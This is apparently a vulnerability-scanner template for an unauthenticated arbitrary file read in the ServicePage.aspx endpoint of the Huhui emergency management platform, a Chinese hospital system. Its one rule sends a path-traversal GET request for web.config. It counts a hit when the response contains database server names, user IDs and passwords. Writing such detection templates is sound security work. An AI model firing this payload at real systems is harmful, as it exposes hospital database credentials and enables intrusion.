id: huhui-servicepage-fileread

info:
  name: 互慧-急诊综合管理平台-ServicePage.aspx-任意文件读取漏洞
  author: avic123
  severity: critical
  verified: true
  description: |-
    互慧-急诊综合管理平台 ServicePage.aspx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态
  reference:
    - https://cn-sec.com/archives/3589203.html
  tags: huhui,fileread
  created: 2025/01/07

rules:
  r0:
    request:
      method: GET
      path: /dcwriter/thirdpart/ServicePage.aspx?wasmres=./../web.config
    expression: >-
      response.status == 200 && response.body.bcontains(b'Server') && response.body.bcontains(b'Database') && response.body.bcontains(b'Uid') && response.body.bcontains(b'Pwd')
expression: r0()
